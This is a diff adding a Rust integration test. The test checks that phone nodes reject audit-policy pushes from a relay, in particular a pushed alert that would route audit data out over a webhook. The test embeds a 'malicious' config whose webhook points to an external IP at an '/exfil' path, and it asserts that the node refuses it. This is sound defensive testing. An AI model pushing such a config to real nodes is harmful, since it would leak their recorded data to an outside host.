@@ -417,3 +417,159 @@ where
         tokio::time::sleep(Duration::from_millis(50)).await;
     }
 }
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn ffi_node_honors_lock_local_and_blocks_untrusted_audit_push_egress() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let relay = RelayHandle::spawn(RelayConfig {
+        bind: "127.0.0.1:0".parse().expect("bind"),
+        data_dir: dir.path().join("relay"),
+        capture: None,
+        database_url: None,
+        allow_signup: false,
+        bootstrap_admin: false,
+        db_schema: None,
+        trust_proxy: Vec::new(),
+        print_admin_token: false,
+        legacy_admin_override: Some((true, Some(86_400))),
+    })
+    .await
+    .expect("relay");
+    let relay_url = format!("wss://{}/v1/connect", relay.local_addr);
+    let admin = Client::connect(&ClientSettings {
+        relay: relay_url.clone(),
+        token: relay.admin_token.clone(),
+        fingerprint: relay.fingerprint.clone(),
+        trust: None,
+    })
+    .await
+    .expect("admin");
+
+    // Pre-seed legacy `lock_local = false` on the FFI node's data_dir AND test default `lock_local = true`.
+    let default_pair = admin
+        .create_pairing_token("phone-locked", NodePolicy::exec(), 600)
+        .await
+        .expect("pair locked");
+    let locked_data = dir.path().join("node-locked");
+    let files = dir.path().join("files");
+    let cache = dir.path().join("cache");
+    std::fs::create_dir_all(&locked_data).expect("mkdir");
+    std::fs::create_dir_all(&files).expect("mkdir");
+    std::fs::create_dir_all(&cache).expect("mkdir");
+    let host = Arc::new(PhoneHost {
+        status: Mutex::new(String::new()),
+        sessions: Mutex::new(std::collections::HashMap::new()),
+    });
+    let shutdown = CancellationToken::new();
+    let io = NodeIo {
+        status: Arc::new(Mutex::new(String::new())),
+        node_id: Arc::new(Mutex::new(String::new())),
+    };
+    let locked_task = tokio::spawn(serve_node(
+        ServeConfig {
+            relay_url: relay_url.clone(),
+            fingerprint: relay.fingerprint.clone(),
+            data_dir: locked_data.clone(),
+            files_dir: files.clone(),
+            cache_dir: cache.clone(),
+            storage_dir: None,
+            name: "phone-locked".into(),
+            pairing_token: Some(default_pair.token),
+            hostname: "pixel".into(),
+            os: "android".into(),
+            arch: "aarch64".into(),
+            version: "0.1.0".into(),
+            ceiling: NodePolicy::exec(),
+            trust: None,
+        },
+        host.clone(),
+        shutdown.clone(),
+        io,
+    ));
+    wait_until(|| async {
+        admin
+            .list_nodes()
+            .await
+            .ok()
+            .is_some_and(|nodes| nodes.iter().any(|n| n.name == "phone-locked" && n.online))
+    })
+    .await;
+    let pushed = "preset = \"standard\"\nlock_local = false\n[recording]\nmode = \"always\"\n";
+    admin
+        .set_audit_policy("phone-locked", None, pushed)
+        .await
+        .expect("push to locked ffi node");
+    tokio::time::sleep(Duration::from_millis(250)).await;
+    assert!(
+        !locked_data.join("audit.toml").exists(),
+        "default FFI node must honor lock_local=true and ignore unauthenticated relay push"
+    );
+    shutdown.cancel();
+    let _ = tokio::time::timeout(Duration::from_secs(5), locked_task).await;
+
+    // Legacy unlocked FFI node (`lock_local = false`) must still reject S3/webhook egress pushes.
+    let legacy_pair = admin
+        .create_pairing_token("phone-legacy", NodePolicy::exec(), 600)
+        .await
+        .expect("pair legacy");
+    let legacy_data = dir.path().join("node-legacy");
+    std::fs::create_dir_all(&legacy_data).expect("mkdir");
+    std::fs::write(
+        legacy_data.join("audit.toml"),
+        "preset = \"standard\"\nlock_local = false\n",
+    )
+    .expect("write legacy");
+    let shutdown2 = CancellationToken::new();
+    let io2 = NodeIo {
+        status: Arc::new(Mutex::new(String::new())),
+        node_id: Arc::new(Mutex::new(String::new())),
+    };
+    let legacy_task = tokio::spawn(serve_node(
+        ServeConfig {
+            relay_url: relay_url.clone(),
+            fingerprint: relay.fingerprint.clone(),
+            data_dir: legacy_data.clone(),
+            files_dir: files,
+            cache_dir: cache,
+            storage_dir: None,
+            name: "phone-legacy".into(),
+            pairing_token: Some(legacy_pair.token),
+            hostname: "pixel".into(),
+            os: "android".into(),
+            arch: "aarch64".into(),
+            version: "0.1.0".into(),
+            ceiling: NodePolicy::exec(),
+            trust: None,
+        },
+        host,
+        shutdown2.clone(),
+        io2,
+    ));
+    wait_until(|| async {
+        admin
+            .list_nodes()
+            .await
+            .ok()
+            .is_some_and(|nodes| nodes.iter().any(|n| n.name == "phone-legacy" && n.online))
+    })
+    .await;
+    let malicious = r#"preset = "standard"
+lock_local = false
+
+[[alerts]]
+name = "exfil"
+webhook = "https://93.184.216.34/exfil"
+"#;
+    admin
+        .set_audit_policy("phone-legacy", None, malicious)
+        .await
+        .expect("relay push");
+    tokio::time::sleep(Duration::from_millis(250)).await;
+    let text = std::fs::read_to_string(legacy_data.join("audit.toml")).expect("read");
+    assert!(
+        !text.contains("93.184.216.34") && !text.contains("exfil"),
+        "legacy FFI node accepted untrusted webhook push: {text}"
+    );
+    shutdown2.cancel();
+    let _ = tokio::time::timeout(Duration::from_secs(5), legacy_task).await;
+}
